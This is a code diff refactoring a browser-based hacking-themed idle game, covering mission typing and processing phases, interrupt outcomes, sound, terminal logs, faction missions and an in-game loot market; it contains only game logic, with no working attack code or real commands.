+    else if(G.interruptFails===2){addHeat(int.heatOnFail||20);log(`> LOCKOUT: heat decay suspended 30s`,'err');}
+    else{log(`> REWARD CUT 50%`,'err');intState.rewardHalved=true;}
+    if(int.id==='auth'){resume=false;abortMission();}
+  }else if(outcome==='abort'){log(`> ${choice.msg}`,'warn');resume=false;abortMission();}
+  else if(outcome==='continue'){log(`> ${choice.msg}`,'warn');addHeat(18);}
+  else if(outcome==='spoof'){log(`> ${choice.msg}`,'dim');addHeat(6);intState.rewardHalved=true;}
+  else if(outcome==='throttle'){log(`> ${choice.msg}`,'dim');}
+  else if(outcome==='reroute'){log(`> ${choice.msg}`,'warn');addHeat(10);}
+  else if(outcome==='race_win'){log(`> ✓ Target locked. Rival blocked.`,'ok');}
+  else if(outcome==='race_lose'){G.interruptFails++;log(`> Rival partial access. Reward halved.`,'warn');intState.rewardHalved=true;}
   intState.processPaused=false;
-  if(resumeProcess&&G.missionRunning&&G.phase==='process'){
-    // Resume processing
-    const mission=MISSIONS.find(m=>m.id===G.activeMission);
-    const template=MT.find(t=>t.id===G.activeMission);
-    if(mission&&template) resumeProcessPhase(mission,template,outcome==='throttle'?2:1);
+  if(resume&&G.missionRunning&&G.phase==='process'){
+    const m=MISSIONS.find(m=>m.id===G.activeMission)||FACTION_MISSIONS.find(m=>m.id===G.activeMission);
+    const t=[...MT,...Object.values(FACTION_MT).flat()].find(t=>t.id===G.activeMission);
+    if(m&&t)resumeProc(m,t,outcome==='throttle'?2:1);
   }
   updateUI();
 }
 
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 // PROCESS TIME
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 function getProcSecs(t){
-  const base=t.pBase,d=t.driver;
-  if(d==='latency')          return Math.max(2,base/(200/Math.max(G.latency,5)));
-  if(d==='cpu')              return Math.max(2,base/(G.cpu/256));
-  if(d==='bandwidth')        return Math.max(2,base/(G.bandwidth/56));
-  if(d==='cpu+ram')          return Math.max(2,base/((G.cpu/256)*.6+(G.ram/512)*.4));
-  if(d==='bandwidth+latency')return Math.max(2,base/((G.bandwidth/56+200/Math.max(G.latency,5))/2));
-  return base;
+  const b=t.pBase,d=t.driver;
+  if(d==='latency')          return Math.max(3,b/(200/Math.max(G.latency,5)));
+  if(d==='cpu')              return Math.max(3,b/(G.cpu/256));
+  if(d==='bandwidth')        return Math.max(3,b/(G.bandwidth/56));
+  if(d==='cpu+ram')          return Math.max(3,b/((G.cpu/256)*.6+(G.ram/512)*.4));
+  if(d==='bandwidth+latency')return Math.max(3,b/((G.bandwidth/56+200/Math.max(G.latency,5))/2));
+  return b;
 }
-function drvLabel(d){return{latency:'RECON SWEEP',cpu:'CRACKING',bandwidth:'DATA TRANSFER','cpu+ram':'EXPLOITATION','bandwidth+latency':'DEPLOYMENT'}[d]||'PROCESSING';}
-function drvTag(d){return{latency:'PING',cpu:'CPU',bandwidth:'XFER','cpu+ram':'EXPLOIT','bandwidth+latency':'DEPLOY'}[d]||'PROC';}
+function dLbl(d){return{latency:'RECON SWEEP',cpu:'CRACKING',bandwidth:'DATA TRANSFER','cpu+ram':'EXPLOITATION','bandwidth+latency':'DEPLOYMENT'}[d]||'PROCESSING';}
+function dTag(d){return{latency:'PING',cpu:'CPU',bandwidth:'XFER','cpu+ram':'EXPLOIT','bandwidth+latency':'DEPLOY'}[d]||'PROC';}
 
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 // AUDIO
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 let aCtx=null;
-function getACtx(){if(!aCtx)aCtx=new(window.AudioContext||window.webkitAudioContext)();return aCtx;}
-function tone(f,t,d,g=.12){try{const c=getACtx(),o=c.createOscillator(),gn=c.createGain();o.connect(gn);gn.connect(c.destination);o.type=t;o.frequency.value=f;gn.gain.setValueAtTime(g,c.currentTime);gn.gain.exponentialRampToValueAtTime(.001,c.currentTime+d);o.start();o.stop(c.currentTime+d);}catch(e){}}
+function getAC(){if(!aCtx)aCtx=new(window.AudioContext||window.webkitAudioContext)();return aCtx;}
+function tone(f,t,d,g=.12){if(!G.soundOn)return;try{const c=getAC(),o=c.createOscillator(),gn=c.createGain();o.connect(gn);gn.connect(c.destination);o.type=t;o.frequency.value=f;gn.gain.setValueAtTime(g,c.currentTime);gn.gain.exponentialRampToValueAtTime(.001,c.currentTime+d);o.start();o.stop(c.currentTime+d);}catch(e){}}
 function playKey(){tone(700+Math.random()*500,'square',.04,.07);}
 function playOK(){[440,554,659].forEach((f,i)=>setTimeout(()=>tone(f,'sine',.25,.11),i*80));}
 function playFail(){tone(160,'sawtooth',.3,.14);}
@@ -689,242 +808,285 @@ function playPrestige(){[220,277,330,440,554,659,880].forEach((f,i)=>setTimeout(
 function playModem(){[1200,2400,1800,3600,2400].forEach((f,i)=>setTimeout(()=>tone(f,'square',.14,.06),i*120));}
 function playAlert(){[880,660,880,660].forEach((f,i)=>setTimeout(()=>tone(f,'square',.1,.1),i*150));}
 
-// ══════════════════════════════════════════════════════
-// TERMINAL
-// ══════════════════════════════════════════════════════
-const term=document.getElementById('term');
-function log(text,cls='ok'){const el=document.createElement('span');el.className='ll '+cls;el.textContent=text;term.appendChild(el);term.scrollTop=term.scrollHeight;}
-function logSep(){log('─'.repeat(36),'sep');}
+function startAmbient(driver){
+  stopAmbient();
+  if(!G.soundOn)return;
+  try{
+    const c=getAC();
+    const freqs={latency:180,cpu:320,bandwidth:220,'cpu+ram':280,'bandwidth+latency':200};
+    const f=freqs[driver]||220;
+    ambientOsc=c.createOscillator(); ambientGain=c.createGain();
+    ambientOsc.connect(ambientGain); ambientGain.connect(c.destination);
+    ambientOsc.type='sine'; ambientOsc.frequency.value=f;
+    ambientGain.gain.setValueAtTime(0,c.currentTime);
+    ambientGain.gain.linearRampToValueAtTime(.04,c.currentTime+1);
+    ambientOsc.start();
+  }catch(e){}
+}
+function stopAmbient(){
+  if(ambientOsc){try{ambientGain?.gain.linearRampToValueAtTime(0,aCtx.currentTime+.5);setTimeout(()=>{try{ambientOsc?.stop();}catch(e){}ambientOsc=null;ambientGain=null;},600);}catch(e){ambientOsc=null;ambientGain=null;}}
+}
+function toggleSound(){
+  G.soundOn=!G.soundOn;
+  localStorage.setItem('hacknode_snd',G.soundOn?'1':'0');
+  const btn=document.getElementById('nb-snd');
+  if(btn){btn.textContent=G.soundOn?'SND✓':'SND';btn.style.color=G.soundOn?'#00ff41':'#4a7a4a';}
+  if(G.soundOn){try{getAC();}catch(e){}}
+  else stopAmbient();
+}
 
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
+// TERMINAL
+// ═══════════════════════════════════════════════
+function getTerm(){return document.getElementById('term');}
+function getMsgPane(){return document.getElementById('term-msg');}
+function log(text,cls='ok'){
+  const el=document.createElement('span');el.className='ll '+cls;el.textContent=text;
+  const t=getTerm(); t.appendChild(el); t.scrollTop=t.scrollHeight;
+}
+function logMsg(text,cls='void'){
+  const el=document.createElement('span');el.className='ll '+cls;el.textContent=text;
+  const m=getMsgPane(); m.appendChild(el); m.scrollTop=m.scrollHeight;
+  // Badge if not on msg tab
+  if(G.activeTab!=='msg'){G.msgUnread=true;document.getElementById('msg-badge').style.display='inline';}
+}
+function logSep(pane='term'){
+  const div=document.createElement('span');div.className='ll sep';div.textContent='─'.repeat(36);
+  const t=document.getElementById(pane==='msg'?'term-msg':'term');t.appendChild(div);t.scrollTop=t.scrollHeight;
+}
+
+// ═══════════════════════════════════════════════
 // TYPING
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 function getBWT(){if(G.bandwidth>=1000000)return 5;if(G.bandwidth>=100000)return 4;if(G.bandwidth>=10000)return 3;if(G.bandwidth>=1000)return 2;return 1;}
-function nextPos(state){
-  const{command,typed}=state; if(typed>=command.length)return command.length;
+function nextPos(st){
+  const{command:c,typed:t}=st; if(t>=c.length)return c.length;
   const tier=G.typingTier;
-  if(tier>=2)return command.length;
-  if(tier===1){const r=command.slice(typed);const sp=r.indexOf(' ');return sp===-1?command.length:typed+sp+1;}
-  return Math.min(typed+[0,1,2,3,4,6][Math.min(getBWT(),5)],command.length);
+  if(tier>=2)return c.length;
+  if(tier===1){
+    // Argument-group-per-tap: skip 1-2 short tokens at once to feel like
+    // "autocomplete by argument chunk" not "one flag at a time"
+    // Short single-char flags (-r, -v, -C) get grouped with next token
+    // Long tokens (IPs, paths, URLs) each count as their own tap
+    let pos=t;
+    let tapsConsumed=0;
+    const maxTaps=1; // always exactly 1 meaningful chunk per tap
+    while(pos<c.length && tapsConsumed<maxTaps){
+      const r=c.slice(pos);
+      const sp=r.indexOf(' ');
+      if(sp===-1){pos=c.length;break;}
+      const token=r.slice(0,sp);
+      pos=pos+sp+1;
+      tapsConsumed++;
+      // If token is a very short flag (<= 3 chars like -r, -v, -C, -x)
+      // consume one more token alongside it so it does not feel too granular
+      if(token.length<=3&&token.startsWith('-')&&pos<c.length){
+        const r2=c.slice(pos);
+        const sp2=r2.indexOf(' ');
+        if(sp2===-1)pos=c.length;
+        else pos=pos+sp2+1;
+      }
+    }
+    return pos;
+  }
+  return Math.min(t+[0,1,2,3,4,6][Math.min(getBWT(),5)],c.length);
 }
 function renderCmd(){document.getElementById('cmdtxt').textContent=TS.command.slice(0,TS.typed);}
-function renderPrestage(){
-  const t=PS.typed,cmd=PS.command;
-  document.getElementById('prestage-typed').textContent=cmd.slice(0,t);
-  document.getElementById('prestage-rest').textContent=cmd.slice(t);
-}
+function renderPS(){document.getElementById('prestage-typed').textContent=PS.command.slice(0,PS.typed);document.getElementById('prestage-rest').textContent=PS.command.slice(PS.typed);}
 
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 // PHASE 1: TYPE
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 function startTypePhase(mission){
   G.phase='type'; G.interruptFails=0;
   TS.command=mission.command; TS.typed=0; renderCmd();
-  const pl=document.getElementById('phlbl');
-  pl.textContent='// PHASE 1: EXECUTE COMMAND'; pl.className='phlbl on';
-  document.getElementById('countdown').className='countdown';
-  document.getElementById('progwrap').classList.add('on');
-  document.getElementById('proglbl').textContent='TYPING';
-  document.getElementById('progfill').className='';
-  document.getElementById('progpct').style.color='#00ff41';
-  document.getElementById('prestage').className='prestage';
-  updatePct(0); updateTapBtn();
+  el('phlbl').textContent='// PHASE 1: EXECUTE COMMAND'; el('phlbl').className='phlbl on';
+  el('countdown').className='countdown'; el('progwrap').classList.add('on');
+  el('proglbl').textContent='TYPING'; el('progfill').className=''; el('progpct').style.color='#00ff41';
+  el('prestage').className='prestage'; updatePct(0); updateTapBtn();
 }
 
 function tapType(){
   if(G.phase!=='type'||!G.missionRunning)return false;
-  const m=MISSIONS.find(m=>m.id===G.activeMission);
+  const allMissions=[...MISSIONS,...FACTION_MISSIONS];
+  const m=allMissions.find(m=>m.id===G.activeMission);
   if(!m||TS.typed>=TS.command.length)return false;
   const prev=TS.typed; TS.typed=nextPos(TS); renderCmd(); playKey();
-  addHeat((m.hPC||.02)*(TS.typed-prev)*(m._intelBonus?.7:1));
+  if(prev===0) onTutFirstTap();
+  addHeat((m.hPC||.04)*(TS.typed-prev)*(m._intelBonus?.7:1));
   const pct=Math.min(100,(TS.typed/TS.command.length)*100);
   G.missionProgress=pct; updatePct(pct);
   if(TS.typed>=TS.command.length){setTimeout(()=>{if(G.missionRunning&&G.phase==='type')startProcPhase(m);},350);}
   return true;
 }
 
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 // PHASE 2: PROCESS
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 function startProcPhase(mission){
   G.phase='process'; G.missionProgress=0;
-  const template=MT.find(t=>t.id===mission.id);
+  onTutPhase2Start();
+  const allT=[...MT,...Object.values(FACTION_MT).flat()];
+  const template=allT.find(t=>t.id===mission.id);
   const secs=getProcSecs(template)*(mission._intelBonus&&template.id==='scp_exfil'?.7:1);
-  startProcInterval(mission,template,secs,1);
-  setupProcUI(template,secs);
-  scheduleFlavor(mission,template,secs);
-  setupPrestage();
-  // Schedule interrupt attempts
-  setTimeout(()=>tryFireInterrupt(),rnd(2000,Math.floor(secs*600)));
-}
-
-function setupProcUI(template,secs){
-  const pl=document.getElementById('phlbl');
-  pl.textContent=`// PHASE 2: ${drvLabel(template.driver)}`; pl.className='phlbl on proc';
-  document.getElementById('proglbl').textContent=drvTag(template.driver);
-  document.getElementById('progfill').className='proc';
-  document.getElementById('progpct').style.color='#cc44ff';
-  updatePct(0); updateTapBtn();
-  // Countdown
-  startCountdown(Math.ceil(secs));
-}
-
-function startCountdown(secs){
-  clearInterval(cdownInt);
-  let t=secs;
-  const el=document.getElementById('countdown');
-  el.className='countdown on';
-  el.textContent=`[ ${t}s ]`;
-  cdownInt=setInterval(()=>{
-    t--;
-    if(t<=0){clearInterval(cdownInt);el.className='countdown';}
-    else el.textContent=`[ ${t}s ]`;
-  },1000);
-}
-
-function startProcInterval(mission,template,secs,speedMult){
-  clearInterval(procInt);
-  const tickMs=150,totalTicks=(secs*1000)/(tickMs*speedMult);
-  let ticks=0;
-  procInt=setInterval(()=>{
-    if(intState.processPaused)return;
-    ticks++;
-    const pct=Math.min(100,(ticks/totalTicks)*100);
-    G.missionProgress=pct; updatePct(pct);
-    if(pct>=100){clearInterval(procInt);clearInterval(cdownInt);completeMission();}
-  },tickMs);
-}
-
-function resumeProcessPhase(mission,template,slowMult=1){
-  // Resume from current progress
-  const remaining=(1-G.missionProgress/100);
-  const secs=getProcSecs(template)*remaining*slowMult;
-  startProcInterval(mission,template,secs,1);
-  startCountdown(Math.ceil(secs));
-}
-
-function scheduleFlavor(mission,template,secs){
-  const fl=[...(template.flavor||[])];
+  el('phlbl').textContent=`// PHASE 2: ${dLbl(template.driver)}`; el('phlbl').className='phlbl on proc';
+  el('proglbl').textContent=dTag(template.driver); el('progfill').className='proc'; el('progpct').style.color='#cc44ff';
+  updatePct(0); updateTapBtn(); startCdown(Math.ceil(secs));
+  startAmbient(template.driver);
+  log(`> Processing... [${dLbl(template.driver)}] ~${Math.ceil(secs)}s`,'proc');
+  // Use sector-specific flavor if available
+  const sectorFlavor=template.flavorByS&&template.flavorByS[G.currentSector];
+  const fl=[...(sectorFlavor||template.flavor||[])];
   fl.forEach((line,i)=>{
     setTimeout(()=>{
       if(G.phase!=='process'||G.activeMission!==mission.id)return;
-      const cooked=line
-        .replace('{port}',mission._port||randPort())
-        .replace('{user}',mission._user||randUser())
-        .replace('{hash}',randHash())
-        .replace('{n}',rnd(100,9999))
-        .replace('{ip}',mission._ip||randIP())
-        .replace('{pct}',Math.floor((i/fl.length)*100)+'%')
-        .replace('{size}',fmtFS(mission._fs||1024));
+      const cooked=line.replace('{port}',mission._port||randPort()).replace('{user}',mission._user||randUser()).replace('{hash}',randHash()).replace('{n}',rnd(100,9999)).replace('{ip}',mission._ip||randIP()).replace('{pct}',Math.floor((i/fl.length)*100)+'%').replace('{size}',fmtFS(mission._fs||1024));
       log('  '+cooked,'dim');
     },(secs*1000/fl.length)*i+300);
   });
+  startProcInt(secs,1);
+  setupPrestage();
+  setTimeout(()=>tryInterrupt(),rnd(Math.floor(secs*300),Math.floor(secs*700)));
+}
+
+function startProcInt(secs,mult){
+  clearInterval(procInt);
+  const tickMs=150,totalTicks=(secs*1000)/(tickMs*mult); let ticks=0;
+  const allT2=[...MT,...Object.values(FACTION_MT).flat()];
+  const tmpl2=allT2.find(t=>t.id===G.activeMission);
+  procInt=setInterval(()=>{
+    if(intState.processPaused)return;
+    ticks++; const pct=Math.min(100,(ticks/totalTicks)*100);
+    G.missionProgress=pct; updatePct(pct);
+    // Heat during processing (30% of typing rate)
+    if(tmpl2) addHeat((tmpl2.hPC||.05)*0.5*(tickMs/1000));
+    if(pct>=100){clearInterval(procInt);clearInterval(cdownInt);stopAmbient();completeMission();}
+  },tickMs);
+}
+
+function resumeProc(mission,template,slow=1){
+  const rem=(1-G.missionProgress/100);
+  const secs=getProcSecs(template)*rem*slow;
+  startProcInt(secs,1); startCdown(Math.ceil(secs));
+}
+
+function startCdown(secs){
+  clearInterval(cdownInt); let t=secs;
+  const e=el('countdown'); e.className='countdown on'; e.textContent=`[ ${t}s ]`;
+  cdownInt=setInterval(()=>{t--;if(t<=0){clearInterval(cdownInt);e.className='countdown';}else e.textContent=`[ ${t}s ]`;},1000);
 }
 
 function setupPrestage(){
-  // Show pre-stage area if there's a queued mission
-  if(G.missionQueue.length===0){document.getElementById('prestage').className='prestage';return;}
-  const nextId=G.missionQueue[0];
-  const nextTemplate=MT.find(t=>t.id===nextId);
-  if(!nextTemplate)return;
-  const nextMission=genMission(nextTemplate);
-  const idx=MISSIONS.findIndex(m=>m.id===nextId);
-  if(idx>=0)MISSIONS[idx]=nextMission;
-
-  PS.command=nextMission.command; PS.typed=0;
-  renderPrestage();
-  document.getElementById('prestage-lbl').textContent='// STAGING NEXT: '+nextTemplate.name;
-  document.getElementById('prestage').className='prestage on';
-
-  // If cron scheduler: auto-type pre-stage
+  if(G.missionQueue.length===0){el('prestage').className='prestage';return;}
+  const nid=G.missionQueue[0];
+  const nt=[...MT,...Object.values(FACTION_MT).flat()].find(t=>t.id===nid);
+  if(!nt)return;
+  const nm=genMission(nt);
+  const idx=MISSIONS.findIndex(m=>m.id===nid);
+  if(idx>=0)MISSIONS[idx]=nm;
+  PS.command=nm.command; PS.typed=0; renderPS();
+  el('prestage-lbl').textContent='// STAGING: '+nt.name;
+  el('prestage').className='prestage on';
   if(G.typingTier>=3){
-    const autoPS=setInterval(()=>{
-      if(G.phase!=='process'){clearInterval(autoPS);return;}
-      if(PS.typed>=PS.command.length){clearInterval(autoPS);return;}
-      PS.typed=Math.min(PS.typed+3,PS.command.length);
-      renderPrestage();
-    },200);
+    const aps=setInterval(()=>{if(G.phase!=='process'){clearInterval(aps);return;}if(PS.typed>=PS.command.length){clearInterval(aps);return;}PS.typed=Math.min(PS.typed+3,PS.command.length);renderPS();},200);
   }
 }
 
-function tapPrestage(){
+function tapPS(){
   if(G.phase!=='process'||PS.typed>=PS.command.length)return false;
-  PS.typed=nextPos(PS); renderPrestage(); playKey(); return true;
+  PS.typed=nextPos(PS); renderPS(); playKey(); return true;
 }
 
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 // COMPLETE / ABORT
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 function completeMission(){
   if(!G.missionRunning)return;
-  const mission=MISSIONS.find(m=>m.id===G.activeMission);
-  const template=MT.find(t=>t.id===G.activeMission);
+  const allM=[...MISSIONS,...FACTION_MISSIONS];
+  const mission=allM.find(m=>m.id===G.activeMission);
+  const allT=[...MT,...Object.values(FACTION_MT).flat()];
+  const template=allT.find(t=>t.id===G.activeMission);
   if(!mission||!template)return;
 
-  // Store intel if this mission drops it
+  // Intel drop from recon
   if(template.drops==='intel'){
-    G.knownTargets[mission.id]={ip:mission._ip,sn:mission._sn,port:mission._port,user:mission._user};
-    // Share intel with related missions
-    if(mission.id==='nmap_scan'){
-      ['hydra_ssh','scp_exfil','metasploit','ssh_backdoor','worm_deploy'].forEach(id=>{
-        if(!G.knownTargets[id])G.knownTargets[id]={ip:mission._ip,sn:mission._sn,port:mission._port,user:mission._user};
-      });
-      log(`> INTEL STORED: ${mission._ip} — follow-up missions get bonuses`,'info');
-    }
+    G.knownTargets[mission.id]={ip:mission._ip,sn:mission._sn,port:mission._port,user:mission._user,corp:mission._corp};
+    ['hydra_ssh','scp_exfil','metasploit','ssh_backdoor','worm_deploy'].forEach(id=>{if(!G.knownTargets[id])G.knownTargets[id]={ip:mission._ip,sn:mission._sn,port:mission._port,user:mission._user,corp:mission._corp};});
+    log(`> INTEL: ${mission._corp} (${mission._ip}) mapped. Follow-ups get bonuses.`,'info');
+    // Sector-aware node reveal — reveals one unknown node in current sector
+    onReconComplete();
   }
 
-  let base=template.reward.base;
-  const earned=Math.floor(base*G.rep*(1+G.missionsCompleted*.06)*(intState.rewardHalved?.5:1));
-  G.credits+=earned; G.missionsCompleted++;
-  checkStory();
+  // Mark node as scanned/owned on map
+  if(template.reward.passive){
+    const nodeKey=mission.id==='worm_deploy'?'cipher_node':mission.id==='ssh_backdoor'?'corp_db':'market';
+    if(G.networkNodes[nodeKey])G.networkNodes[nodeKey].status='owned';
+    log(`> NODE OWNED: passive income active`,'ok');
+  }
 
-  log(`> ✓ MISSION COMPLETE: ${mission.name}`,'ok');
-  log(`> CREDITS EARNED: +$${fmtNum(earned)}`+(intState.rewardHalved?' [50% penalty]':''),'ok');
-  if(template.reward.passive)log(`> PASSIVE NODE ACTIVE`,'ok');
-  playOK(); showFloat(earned); addHeat(template.hOC||5);
+  // Economy v2: small direct reward + loot listed on darkweb market
+  const base=template.reward.base;
+  const scale=1+G.missionsCompleted*.05;
+  const factionBonus=G.faction?1.15:1;
+  const penMult=intState.rewardHalved?.5:1;
+  // 20% paid direct, 80% goes to market as loot
+  const directEarned=Math.floor(base*0.2*G.rep*scale*factionBonus*penMult);
+  G.credits+=directEarned; G.totalCreditsEarned=(G.totalCreditsEarned||0)+directEarned;
+  G.missionsCompleted++;
+  onMissionCompletedInSector(G.activeMission);
+  checkNarrative();
+
+  // Generate loot for market
+  const loot=generateLoot(G.activeMission, mission._corp);
+  const lootVal=loot?loot.qty*loot.valueEach:0;
+  const lootStr=loot?` | ${fmtNum(loot.qty)} ${loot.label} → MARKET`:'';
+
+  onTutPhase2Done();
+  log(`> ✓ ${mission.name} — $${fmtNum(directEarned)} cash${lootStr}`+(intState.rewardHalved?' [PENALTY]':''),'ok');
+  if(loot){
+    const stacked=G.lootInventory.find(l=>l.type===LOOT_TABLE[G.activeMission]?.type);
+    const stackNote=stacked&&stacked.qty>loot.qty?` (stacked — total: ${fmtNum(stacked.qty)} units)`:'';
+    log(`> MARKET: $${fmtNum(lootVal)} of ${loot.label} listed at $${loot.valueEach.toFixed(2)}/unit${stackNote}`,'dim');
+  }
+  if(template.reward.passive)log(`> PASSIVE NODE: income dripping`,'ok');
+  playOK(); showFloat(directEarned); addHeat(template.hOC||5);
 
   G.missionRunning=false; G.phase=null; G.activeMission=null; G.missionProgress=0;
   TS.command=''; TS.typed=0; PS.command=''; PS.typed=0;
-  clearInterval(procInt); clearInterval(cdownInt);
-  document.getElementById('cmdtxt').textContent='';
-  document.getElementById('progwrap').classList.remove('on');
-  document.getElementById('phlbl').className='phlbl';
-  document.getElementById('countdown').className='countdown';
-  document.getElementById('prestage').className='prestage';
+  clearInterval(procInt); clearInterval(cdownInt); stopAmbient();
+  el('cmdtxt').textContent='';
+  el('progwrap').classList.remove('on'); el('phlbl').className='phlbl';
+  el('countdown').className='countdown'; el('prestage').className='prestage';
 
-  const btn=document.getElementById('tapbtn');
-  btn.classList.add('locked'); tapCD=true;
+  const btn=el('tapbtn'); btn.classList.add('locked'); tapCD=true;
   setTimeout(()=>{
     btn.classList.remove('locked'); tapCD=false; updateUI();
-    if(G.missionQueue.length>0){
-      const nid=G.missionQueue.shift(); updateQdisp(); selectMission(nid,true); // pass pre-staged flag
-    } else if(G.typingTier>=3){autoStartBest();}
-    else{updateTapBtn();}
+    if(G.missionQueue.length>0){const nid=G.missionQueue.shift();updateQdisp();selectMission(nid,true);}
+    else if(G.typingTier>=3)autoStartBest();
+    else updateTapBtn();
   },700);
   updateUI();
 }
 
 function abortMission(){
   if(!G.activeMission)return;
-  clearInterval(procInt); clearInterval(cdownInt); clearInterval(intTimerInt);
-  document.getElementById('interrupt-overlay').classList.remove('on');
-  intState.active=false; intState.processPaused=false;
+  clearInterval(procInt); clearInterval(cdownInt); clearInterval(intTimerInt); stopAmbient();
+  el('int-ov').classList.remove('on'); intState.active=false; intState.processPaused=false;
   log('> MISSION ABORTED','warn');
   G.missionRunning=false; G.phase=null; G.activeMission=null; G.missionProgress=0;
   TS.command=''; TS.typed=0; PS.command=''; PS.typed=0;
-  document.getElementById('cmdtxt').textContent='';
-  document.getElementById('progwrap').classList.remove('on');
-  document.getElementById('phlbl').className='phlbl';
-  document.getElementById('countdown').className='countdown';
-  document.getElementById('prestage').className='prestage';
+  el('cmdtxt').textContent='';
+  el('progwrap').classList.remove('on'); el('phlbl').className='phlbl';
+  el('countdown').className='countdown'; el('prestage').className='prestage';
   updateTapBtn(); updateUI();
 }
 
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 // SELECT / QUEUE
-// ══════════════════════════════════════════════════════
-function selectMission(id,usePreStaged=false){
-  const template=MT.find(t=>t.id===id); if(!template)return;
+// ═══════════════════════════════════════════════
+function selectMission(id,usePS=false){
+  const allT=[...MT,...Object.values(FACTION_MT).flat()];
+  const template=allT.find(t=>t.id===id); if(!template)return;
   const[minM,minC]=template.unlockAt;
   if(G.missionsCompleted<minM||G.credits<minC)return;
   if(G.missionRunning){
@@ -935,130 +1097,128 @@ function selectMission(id,usePreStaged=false){
     log(`> QUEUED: ${template.name}`,'info');
     renderPanel('missions'); return;
   }
-  // Use pre-staged mission data if available
   let mission;
-  if(usePreStaged&&PS.command&&PS.command===MISSIONS.find(m=>m.id===id)?.command){
-    mission=MISSIONS.find(m=>m.id===id); // already generated
-  } else {
+  const allM=[...MISSIONS,...FACTION_MISSIONS];
+  const existing=allM.find(m=>m.id===id);
+  if(usePS&&PS.command&&existing?.command===PS.command){mission=existing;}
+  else{
     mission=genMission(template);
     const idx=MISSIONS.findIndex(m=>m.id===id);
     if(idx>=0)MISSIONS[idx]=mission;
+    else{const fi=FACTION_MISSIONS.findIndex(m=>m.id===id);if(fi>=0)FACTION_MISSIONS[fi]=mission;}
   }
   G.activeMission=id; G.missionRunning=true;
+  onTutMissionSelected();
   logSep();
   log(`> INITIATING: ${mission.name}`,'info');
+  log(`> TARGET: ${mission._corp} (${mission._ip})`,'dim');
   log(`> CMD: ${mission.command}`,'dim');
-  if(mission._intelBonus)log(`> INTEL BONUS ACTIVE: reduced heat & faster process`,'info');
-  log(`> Est. process: ~${Math.ceil(getProcSecs(template))}s [${drvLabel(template.driver)}]`,'dim');
+  if(mission._intelBonus)log(`> INTEL ACTIVE: reduced heat + faster process`,'info');
+  log(`> Est. process: ~${Math.ceil(getProcSecs(template))}s [${dLbl(template.driver)}]`,'dim');
   logSep();
   showPanel('none'); playModem();
-  // If pre-staged typing was done, carry it over
-  if(usePreStaged&&PS.typed>0&&PS.command===mission.command){
-    TS.command=mission.command; TS.typed=PS.typed;
-    PS.command=''; PS.typed=0;
+  if(usePS&&PS.typed>0&&PS.command===mission.command){
+    TS.command=mission.command; TS.typed=PS.typed; PS.command=''; PS.typed=0;
     G.phase='type';
-    const pct=(TS.typed/TS.command.length)*100;
-    document.getElementById('phlbl').textContent='// PHASE 1: EXECUTE COMMAND';
-    document.getElementById('phlbl').className='phlbl on';
-    document.getElementById('progwrap').classList.add('on');
-    document.getElementById('proglbl').textContent='TYPING';
-    document.getElementById('progfill').className='';
-    document.getElementById('progpct').style.color='#00ff41';
-    document.getElementById('prestage').className='prestage';
-    updatePct(pct); renderCmd();
-    if(TS.typed>=TS.command.length){setTimeout(()=>startProcPhase(mission),350);}
+    el('phlbl').textContent='// PHASE 1: EXECUTE COMMAND'; el('phlbl').className='phlbl on';
+    el('progwrap').classList.add('on'); el('proglbl').textContent='TYPING'; el('progfill').className=''; el('progpct').style.color='#00ff41';
+    el('prestage').className='prestage'; renderCmd();
+    const pct=(TS.typed/TS.command.length)*100; updatePct(pct);
+    if(TS.typed>=TS.command.length)setTimeout(()=>startProcPhase(mission),350);
     else updateTapBtn();
-  } else {
-    startTypePhase(mission);
-  }
+  }else startTypePhase(mission);
 }
 
 function autoStartBest(){
-  const av=MT.filter(t=>{const[m,c]=t.unlockAt;return G.missionsCompleted>=m&&G.credits>=c;});
+  const allT=[...MT,...(G.faction?FACTION_MT[G.faction]:[])];
+  const av=allT.filter(t=>{const[m,c]=t.unlockAt;return G.missionsCompleted>=m&&G.credits>=c;});
   if(av.length)selectMission(av[av.length-1].id);
 }
 
 function updateQdisp(){
-  const el=document.getElementById('qind'),d=document.getElementById('qdisplay');
-  if(G.missionQueue.length===0){el.classList.remove('on');return;}
-  el.classList.add('on');
-  d.textContent=G.missionQueue.map(id=>{const t=MT.find(t=>t.id===id);return t?t.name.split(':')[0].trim():id;}).join(' → ');
+  const e=el('qind'),d=el('qdisplay');
+  if(G.missionQueue.length===0){e.classList.remove('on');return;}
+  e.classList.add('on');
+  d.textContent=G.missionQueue.map(id=>{const t=[...MT,...Object.values(FACTION_MT).flat()].find(t=>t.id===id);return t?t.name.split(':')[0].trim():id;}).join(' → ');
 }
 
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 // TAP
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 function handleTap(){
   if(tapCD||intState.active)return;
-  if(G.phase==='process'){
-    // During processing: tap advances pre-stage
-    if(tapPrestage())return;
-    return;
-  }
+  if(G.phase==='process'){if(tapPS())return;return;}
   if(!G.missionRunning||!G.activeMission)return;
   if(G.heat>=100){log('> TRACE DETECTED — lay low','err');playFail();return;}
-  tapType();
-  tapCD=true; setTimeout(()=>tapCD=false,40);
+  tapType(); tapCD=true; setTimeout(()=>tapCD=false,40);
 }
 
 function updateTapBtn(){
-  const btn=document.getElementById('tapbtn');
+  const btn=el('tapbtn');
   if(!G.missionRunning){btn.textContent='[ SELECT MISSION ]';btn.className='none';return;}
   if(G.phase==='process'){
-    const t=MT.find(t=>t.id===G.activeMission);
-    const hasQueue=G.missionQueue.length>0&&PS.typed<PS.command.length;
